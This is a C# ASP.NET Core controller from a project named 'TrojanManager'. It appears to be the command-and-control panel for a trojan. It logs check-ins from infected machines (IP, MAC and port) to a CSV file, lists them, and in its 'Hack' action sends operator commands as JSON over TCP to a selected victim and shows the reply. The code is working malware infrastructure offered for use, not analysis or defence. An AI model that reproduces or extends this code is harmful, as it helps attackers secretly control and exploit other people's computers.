using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;
using TrojanManager.Models;

namespace TrojanManager.Controllers
{
    public class UsersController : Controller
    {

        // GET: Users
        public ActionResult Index()
        {
            string text = System.IO.File.ReadAllText(@"wwwroot\Users.csv");

            var users = text.Split('\n').ToList();

            var model = new List<User>();
            foreach(var user in users)
            {
                var userModel = new User(user);
                model.Add(userModel);
            }

            return View(model);
        }

        public ActionResult Create(string Name, string Ip, string Port)
        {

            return Ok();
        }
        public ActionResult AddConnection(string ip, string mac, int port)
        {
            RemoveByMac(mac);
            using (System.IO.StreamWriter file =
         new System.IO.StreamWriter(@"wwwroot\Users.csv", true))
            {
                var userSB = new StringBuilder();
                var guid = Guid.NewGuid();
                userSB.Append(guid.ToString() + ", ");
                userSB.Append(mac + ", ");
                userSB.Append(ip + ", ");
                userSB.Append(port.ToString());


                file.Write(userSB.ToString());
            }
            return Ok();
        }
        public ActionResult Hello()
        {
            return RedirectToAction(nameof(Index));
        }
        private void RemoveByMac(string mac)
        {

            string text = System.IO.File.ReadAllText(@"wwwroot\Users.csv");

            var users = text.Split('\n').ToList();

            users.RemoveAll(u => u.Contains(mac));

            System.IO.File.WriteAllText(@"wwwroot\Users.csv", string.Empty);

            using (System.IO.StreamWriter file =
         new System.IO.StreamWriter(@"wwwroot\Users.csv", true))
            {
                foreach (var user in users)
                {
                    
                    file.WriteLine(user.TrimEnd());
                }
            }


        }
        private string GetUserByGUID(Guid guid)
        {

            string text = System.IO.File.ReadAllText(@"wwwroot\Users.csv");

            var users = text.Split('\n').ToList();

            var model = new List<User>();
            foreach (var user in users)
            {
                if (user.Contains(guid.ToString()))
                    return user;
            }

            return String.Empty;
        }
        private string SendCommandsTCP(string message, string ipAdress, int port)
        {
            
            try
            {
                // Create a TcpClient.
                // Note, for this client to work you need to have a TcpServer 
                // connected to the same address as specified by the server, port
                // combination.
                //var ipAdress = "192.168.43.128";
                //Int32 port = 12831;
                TcpClient client = new TcpClient(ipAdress, port);

                // Translate the passed message into ASCII and store it as a Byte array.
                Byte[] data = System.Text.Encoding.ASCII.GetBytes(message);

                // Get a client stream for reading and writing.
                //  Stream stream = client.GetStream();

                NetworkStream stream = client.GetStream();

                // Send the message to the connected TcpServer. 
                stream.Write(data, 0, data.Length);

                // Receive the TcpServer.response.

                // Buffer to store the response bytes.
                data = new Byte[2048];

                // String to store the response ASCII representation.
                String responseData = String.Empty;

                // Read the first batch of the TcpServer response bytes.
                Int32 bytes = stream.Read(data, 0, data.Length);
                responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);

                stream.Close();
                client.Close();

                return responseData;

                // Close everything.
         
            }
            catch (ArgumentNullException e)
            {
                Console.WriteLine("ArgumentNullException: {0}", e);
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e);
            }

            return String.Empty;
        }

        public ActionResult Hack(Guid id, string response)
        {
            var model = new HackCommands(id, response);

            return View(model);
        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult Hack(HackCommands hack)
        {
            try
            {
                var user = GetUserByGUID(hack.UserId);

                if (!String.IsNullOrEmpty(user))
                {
                    var userData = user.Split(", ");
                    var json = JsonConvert.SerializeObject(hack);

                    String resp = String.Empty;
                    if (userData != null)
                    {
                        resp = SendCommandsTCP(json, userData[2], Int32.Parse(userData[3]));
                        var model = new HackCommands(hack.UserId);
                        if(!String.IsNullOrEmpty(resp))
                            return RedirectToAction("Hack",new { id = hack.UserId, response = resp });
                    }
                }
      
            }
            catch(Exception ex)
            {
                
            }

            return RedirectToAction("Hack", new { id = hack.UserId });
        }

        // GET: Users/Delete/5
        public ActionResult Delete(int id)
        {
            return View();
        }

        // POST: Users/Delete/5
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult Delete(int id, IFormCollection collection)
        {
            try
            {
                // TODO: Add delete logic here

                return RedirectToAction(nameof(Index));
            }
            catch
            {
                return View();
            }
        }
    }
}